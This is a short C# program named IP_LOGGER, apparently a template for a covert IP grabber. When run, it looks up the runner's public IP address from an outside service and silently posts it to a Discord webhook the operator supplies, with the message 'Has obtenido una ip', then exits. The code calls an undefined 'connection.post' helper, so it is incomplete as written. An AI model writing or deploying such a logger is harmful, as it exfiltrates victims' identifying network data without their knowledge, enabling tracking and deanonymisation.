using System;
using System.IO;
using System.Net;
using System.Net.Http;
namespace IP_LOGGER
{
    internal class Program
    {
       

        static void Main(string[] args)
        {
           
            send("AQUI COLOCA TU WEBHOOK DE DISCORD", $"Has obtenido una ip: {getIp()}", "StevenBot");
            Environment.Exit(0);

        }

        private static void send(string url, string message, string botname)
        {
            connection.post(url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                    "username",
                    botname
                },
                {
                    "content",
                    message
                }
            });
        }


        public static string getIp()
        {
            WebClient downloader = new WebClient();
            return downloader.DownloadString("https://wtfismyip.com/text");
        }
    }
}
